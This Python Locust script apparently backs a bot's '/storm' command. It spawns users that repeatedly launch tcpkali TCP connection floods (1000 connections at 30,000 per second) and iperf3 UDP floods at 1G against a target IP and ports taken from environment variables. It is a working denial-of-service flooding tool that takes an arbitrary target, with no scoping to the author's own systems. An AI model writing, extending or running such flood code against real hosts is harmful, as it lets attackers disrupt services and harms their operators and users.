import os
import time
import subprocess
from locust import User, task, constant, events

# Read target info from environment (set by the bot’s /storm command)
TARGET_IP     = os.getenv("LOCUST_TARGET_IP", "127.0.0.1")
TCP_PORT      = int(os.getenv("LOCUST_TCP_PORT", "12345"))
UDP_PORT      = int(os.getenv("LOCUST_UDP_PORT", "12345"))
UDP_BANDWIDTH = os.getenv("LOCUST_UDP_BW", "1G")

class KaliUser(User):
    wait_time = constant(0)

    @task(1)
    def tcpkali_flood(self):
        """1s tcpkali flood: 1000 conns @ 30000 conn/s"""
        cmd = [
            "tcpkali",
            "--connections", "1000",
            "--connect-rate", "30000",
            "--duration", "1",
            f"{TARGET_IP}:{TCP_PORT}",
        ]
        start = time.time()
        exception = None
        try:
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            p.wait(timeout=2)
        except Exception as e:
            exception = e
        elapsed = int((time.time() - start) * 1000)
        events.request.fire(
            request_type="tcpkali",
            name="1s-tcpkali",
            response_time=elapsed,
            response_length=0,
            exception=exception,
        )

class IperfUser(User):
    wait_time = constant(0)

    @task(1)
    def iperf_flood(self):
        """1s iperf3 UDP flood at configured bandwidth"""
        cmd = [
            "iperf3",
            "-c", TARGET_IP,
            "-u",
            "-b", UDP_BANDWIDTH,
            "-t", "1",
            "-p", str(UDP_PORT),
            "-y", "C",
        ]
        start = time.time()
        exception = None
        try:
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            p.wait(timeout=2)
        except Exception as e:
            exception = e
        elapsed = int((time.time() - start) * 1000)
        events.request.fire(
            request_type="iperf3",
            name="1s-iperf3-udp",
            response_time=elapsed,
            response_length=0,
            exception=exception,
        )
      
